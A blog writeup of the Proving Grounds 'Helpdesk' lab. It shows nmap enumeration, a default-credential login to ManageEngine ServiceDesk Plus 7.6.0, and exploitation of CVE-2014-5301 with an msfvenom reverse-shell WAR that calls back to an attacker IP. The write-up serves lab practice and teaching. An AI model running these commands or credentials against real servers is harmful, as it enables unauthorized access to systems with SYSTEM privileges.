---
layout: single
title: Helpdesk - Proving grounds Practice
date: 2023-06-15
classes: wide
header:
  teaser: /assets/images/windows.png
categories:
  - provinggrounds
  - infosec
tags:
  - provinggrounds
  - windows
  - easy
---

## Linux

![](/assets/images/windows.png)

This blog post is a writeup of the Helpdesk machine from Proving grounds practice.

### Summary
------------------
- ManageEngine allows us to access with the default credentials.
- Having a valid user, we are able to exploit CVE-2014-5301 and get a reverse shell as a privileged user.

### Detailed steps
------------------

### Enumeration

I started just enumerating the open ports with:
```
nmap -Pn -p- 192.168.152.43
```
![nmap1](\assets\images\pg-practice-helpdesk\1.JPG)

Knowing which ports are open, I executed an agressive nmap with:
```
nmap -A -Pn --script=vuln 192.168.152.43 -p 135,139,445,3389,8080 -o nmapa.txt
```
![nmap2](\assets\images\pg-practice-helpdesk\2_2.JPG)

As we can see in the last picture, there is a web server in 8080 port.
By accessing the website I was able to see a ManageEngine ServiceDesk Plus `7.6.0`

![manageengine](\assets\images\pg-practice-helpdesk\3.JPG)

### Explotation

This ManageEngine version is vulnerable to `CVE-2014-5301`

```
Vulnerability:  CVE-2014-5301
System Vulnerable: ManageEngine 
Vulnerability Explanation: Directory traversal vulnerability in ServiceDesk Plus MSP v5 to v9.0 v9030; AssetExplorer v4 to v6.1; SupportCenter v5 to v7.9; IT360 v8 to v10.4.  
Severity: high
```

In order to gain access I downloaded a python exploit from: https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py
 - To exploit this vulnerability you need to have a valid username and password so I decided to search the default credentials used by ManageEngine.

	Google search:
	![manageengine2](\assets\images\pg-practice-helpdesk\8.JPG)

	To my surprise, it worked
	![manageengine3](\assets\images\pg-practice-helpdesk\9.JPG)

	![manageengine5](\assets\images\pg-practice-helpdesk\10.JPG)

 - Now, having our valid credentials, it is necessary to create the payload in a WAR file with `mfsvenom`:
	```
	msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.231 LPORT=5555 -f war > shell.war
	```
	![manageengine6](\assets\images\pg-practice-helpdesk\7.JPG)
	
 - Before executing the payload I opened a netcat listener on 5555 port.
	![manageengine7](\assets\images\pg-practice-helpdesk\6.JPG)
	
 - The last step was run the exploit indicating the target, a valid credentials and our WAR file:
 ```
 ./exploit.py 192.168.152.43 8080 administrator administrator shell.war
 ```
 ![manageengine8](\assets\images\pg-practice-helpdesk\11.JPG)
 

After running the exploit I was able to catch the reverse shell as a high privileged user.
![manageengine9](\assets\images\pg-practice-helpdesk\12.JPG)

Being NT Authority\System I could find the root flag in Administrator's desktop
![flag1](\assets\images\pg-practice-helpdesk\25.JPG)
![flag2](\assets\images\pg-practice-helpdesk\rootf.JPG)